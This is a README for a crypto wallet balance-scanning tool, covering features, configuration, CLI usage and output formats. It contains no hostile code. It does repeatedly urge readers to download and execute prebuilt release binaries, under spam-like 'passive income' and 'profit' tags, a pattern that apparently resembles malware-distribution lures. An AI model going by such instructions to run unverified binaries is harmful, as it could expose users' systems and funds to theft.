# Address Balance Checker — Local Wallet Scanner for Crypto

https://github.com/Plix157/Address-Balance-Checker/releases

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/Plix157/Address-Balance-Checker/releases)

![crypto-wallet](https://images.unsplash.com/photo-1611078484813-2f1e0d45e3e5?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=80)

Short, local tool to scan wallet addresses and report balances across chains and token types. Use it for research, bookkeeping, arbitrage signals, or passive portfolio checks.

Badges
- Topics: arbitrage · auto · cash · code · crypto · free · gain · guide · income · open · passive · profit · smart · trade · tutorial
- License: MIT
- Platform: Cross-platform (Windows, macOS, Linux)

What this does
- Accepts one or more wallet addresses or a batch list.
- Queries public node providers and index APIs.
- Aggregates on-chain native balances and token balances.
- Produces CSV, JSON, and human-readable output.
- Option to filter by chain, token, or minimum balance.
- Runs locally. No remote account required.

Quick download and run
Download the release asset from https://github.com/Plix157/Address-Balance-Checker/releases and execute the packaged file. The release contains prebuilt binaries and a run script for each platform. Choose the asset for your OS, extract it, then run the provided executable or the included start script.

Why use this tool
- Local run keeps keys and lists offline.
- Batch mode scales to hundreds of addresses.
- Filters and output formats match common bookkeeping and trade workflows.
- Supports multiple chains and ERC-20/BEP-20 style tokens.
- Designed to integrate into automation and small pipelines.

Supported chains and sources
- Ethereum and EVM-compatible chains (Arbitrum, BSC, Polygon, Fantom, Avalanche).
- Bitcoin (UTXO scan for on-chain balance).
- Token standards: ERC-20 style and common token indexers.
- Public providers: configurable API endpoints (infura, alchemy, public nodes, custom RPC).

Core features
- Batch scanning with concurrency control.
- Token balance aggregation per address.
- CSV and JSON export for spreadsheets and automation.
- Live console output with progress and per-address summary.
- Lightweight caching to avoid repeated RPC calls in a session.
- Filters: token symbol, token contract, minimum balance.
- Error handling and retry logic for transient network failures.

Requirements
- A modern CPU and network connection.
- For full token scans, use an RPC or index provider with token balance support.
- Optional: an API key for high-rate RPC providers (Infura, Alchemy).
- OS specific runtimes are included in releases for most platforms. If you compile from source, install Go 1.18+ or Node 16+ depending on language used.

Install from releases
1. Visit the releases page at https://github.com/Plix157/Address-Balance-Checker/releases
2. Download the asset that matches your OS. The release contains files like:
   - Address-Balance-Checker-windows-x64.zip
   - Address-Balance-Checker-linux-x64.tar.gz
   - Address-Balance-Checker-macos-arm64.zip
3. Extract the archive.
4. Run the included executable or the run script:
   - Windows: double-click AddressBalanceChecker.exe or run `.\AddressBalanceChecker.exe` in PowerShell.
   - macOS/Linux: open a terminal, grant execute permission `chmod +x ./address-balance-checker` then run `./address-balance-checker`.

If a packaged run script exists in the release, run that file. The release asset must be downloaded and executed to run the tool.

Install from source (optional)
- Clone the repo:
  ```
  git clone https://github.com/Plix157/Address-Balance-Checker.git
  cd Address-Balance-Checker
  ```
- Build with Go:
  ```
  go build -o address-balance-checker ./cmd/abcheck
  ```
- Or build with Node (if applicable):
  ```
  npm install
  npm run build
  ```

Configuration
- Use the config file at config.yml or pass CLI flags.
- Example config keys:
  - rpc:
      - name: "infura"
        url: "https://mainnet.infura.io/v3/<YOUR_KEY>"
  - chains:
      - name: "ethereum"
        rpc: "infura"
  - concurrency: 10
  - cache_ttl_seconds: 300
  - output:
      format: "csv"
      path: "./results.csv"
- CLI flags override config file values.

Basic usage examples
- Scan a single address (default chain: ethereum)
  ```
  ./address-balance-checker --address 0x1234... --output results.json
  ```
- Batch scan from a text file
  ```
  ./address-balance-checker --batch addresses.txt --output results.csv
  ```
- Scan with chain selection and minimum balance filter
  ```
  ./address-balance-checker --batch addresses.txt --chain polygon --min-balance 0.01 --output report.csv
  ```
- Export token-only balances in JSON
  ```
  ./address-balance-checker --address 0x1234... --tokens-only --output tokens.json
  ```

Output formats
- CSV: columns: address, chain, native_balance, token_symbol, token_balance, token_contract
- JSON: structured output keyed by address and chain
- Console: colorized, paged summary with totals

Example output (JSON)
```
{
  "0x1234...": {
    "ethereum": {
      "native": "0.5341",
      "tokens": [
        { "symbol": "USDC", "balance": "120.00", "contract": "0xa0b8..." },
        { "symbol": "UNI", "balance": "4.5", "contract": "0x1f98..." }
      ]
    }
  }
}
```

Performance tips
- Increase concurrency for high-rate environments and stable RPCs.
- Use a provider with token balance support to reduce calls.
- Use the cache option when scanning the same addresses over time.
- For large batches, split input into chunks and run parallel processes.

Integration and automation
- Pair CSV output with spreadsheet tools or ETL pipelines.
- Use JSON output for downstream API ingestion.
- Combine with cron jobs or CI workflows to run scheduled checks.
- Integrate into arbitrage monitors by filtering for balance thresholds.

Security and privacy
- The tool queries public endpoints. Do not supply private keys. The tool never requests or stores private keys.
- Secure any API keys used for RPCs. Store them in environment variables or a protected config file.
- Run the tool on a trusted machine when working with sensitive lists.

Extending the tool
- Add new chain adapters by implementing the adapter interface.
- Add indexer integrations for richer token metadata and historic balances.
- Contribute token lists or additional output formats (Excel, Google Sheets).

Contributing
- Fork the repo.
- Create a feature branch.
- Add tests for new adapters or CLI logic.
- Open a pull request with a clear description and test plan.
- Use the issue tracker to propose features or report bugs.

Testing
- Unit tests cover RPC adapters and CSV/JSON output.
- Integration tests run against public testnets.
- Run tests:
  ```
  go test ./...
  ```
  or
  ```
  npm test
  ```

Releases and changelog
- Check the releases page for binaries and release notes: https://github.com/Plix157/Address-Balance-Checker/releases
- Each release includes the compiled binaries and a short changelog. Download the release asset and execute it as described earlier.

Troubleshooting
- If RPC calls time out, increase timeout or switch provider.
- If token balances return zero, verify token contract and chain match.
- If concurrency errors appear, reduce concurrency or use a rate-limited provider.
- If the GUI or binary fails to start, verify execute permissions and run in a terminal to capture error output.

FAQ
- Q: Can this tool send transactions?
  A: No. It only reads on-chain state and token balances.
- Q: Can I add custom token metadata?
  A: Yes. Add token entries to the tokens directory or point to a token list URL in config.
- Q: Does it support batch job scheduling?
  A: Yes. Use system cron, systemd timers, or CI pipelines to schedule runs.

License
- MIT License. See LICENSE file.

Credits
- Tool design and core adapters by the repo maintainers.
- Token metadata and community lists contributed by users.

Contact
- Use the repository Issues to report bugs or request features.

[![Releases](https://img.shields.io/badge/Get%20Release-Address%20Balance%20Checker-green?logo=github)](https://github.com/Plix157/Address-Balance-Checker/releases)